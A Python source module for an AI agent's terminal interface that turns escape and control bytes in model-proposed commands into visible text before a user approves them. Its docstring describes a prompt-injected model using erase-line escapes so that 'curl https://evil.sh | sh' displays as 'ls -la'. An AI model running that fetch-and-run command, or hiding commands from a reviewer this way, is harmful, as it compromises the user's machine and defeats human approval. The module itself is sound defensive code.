"""Neutralize terminal control sequences in model-supplied text before it is
rendered.

The approval panel is the one control standing between a prompt-injected model
and the user's shell, so what it displays must be what will run. Rich appends a
``Text`` segment's characters to the output buffer raw and Textual's compositor
does not filter them, so an ``ESC[2K`` (erase line) + ``ESC[1G`` (column 1) pair
inside a proposed command repaints the line the user is reading: they see
``$ ls -la`` and approve ``curl https://evil.sh | sh``.

We neutralize rather than strip so nothing is silently removed from the text the
user is judging — an escape becomes visible as ``^[`` and the command stays
legible."""

import re

# CSI (``ESC[`` … final byte) and OSC (``ESC]`` … BEL or ST) cover the sequences
# that move the cursor or erase, which is all an attacker needs. The catch-all
# ``ESC[\s\S]`` arm picks up the two-character escapes (e.g. ``ESC 7`` save-cursor)
# so no ESC survives regardless of what follows it. ``[\s\S]`` rather than ``.``
# deliberately: ``.`` does not match a newline, so ``ESC\n`` would leave a bare
# ESC in the output.
_ESCAPES = re.compile(
    r"\x1b\[[0-?]*[ -/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b[\s\S]"
)

# Every C0 control except the two that are legitimate content in a command, a
# file, or a script, plus the C1 range (\x80-\x9f). \r is excluded deliberately:
# Rich already normalizes it, and leaving it here would double-escape carriage
# returns Rich never emits. C1 is included because \x9b/\x9d are the single-byte
# forms of CSI/OSC (the ESC[ / ESC] sequences _ESCAPES catches above) — some
# terminals honor them directly, so a raw C1 byte could reopen the same repaint
# this module exists to close. Whether a given terminal actually acts on 8-bit
# C1 is terminal/locale dependent and unverified here; this is defense-in-depth,
# not a confirmed exploit path like the 7-bit ESC[ / ESC] forms above.
_CONTROLS = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]")


def _caret(match: re.Match) -> str:
    """Render one stripped control byte visibly. C0 (and DEL) have a standard
    caret notation (``chr ^ 0x40``, e.g. ``\\x07`` -> ``^G``, ``\\x7f`` -> ``^?``).
    C1 (\\x80-\\x9f) has no such convention — XORing would land on unrelated
    Latin-1 letters — so those render as a literal hex escape instead."""
    code = ord(match.group(0))
    if code < 0x80:
        return f"^{chr(code ^ 0x40)}"
    return f"\\x{code:02x}"


def safe_text(value: object) -> str:
    """``str(value)`` with terminal control sequences made visible.

    Escapes render as ``^[`` followed by their literal tail; other C0/DEL
    controls render as ``^`` plus the caret-notation letter (``\\x07`` -> ``^G``);
    C1 controls (\\x80-\\x9f) render as a hex escape (``\\x9b`` -> ``\\x9b`` text).
    ``\\n`` and ``\\t`` pass through untouched — they are real content and the
    callers split on newlines."""
    text = str(value)
    text = _ESCAPES.sub(lambda m: "^[" + m.group(0)[1:], text)
    return _CONTROLS.sub(_caret, text)
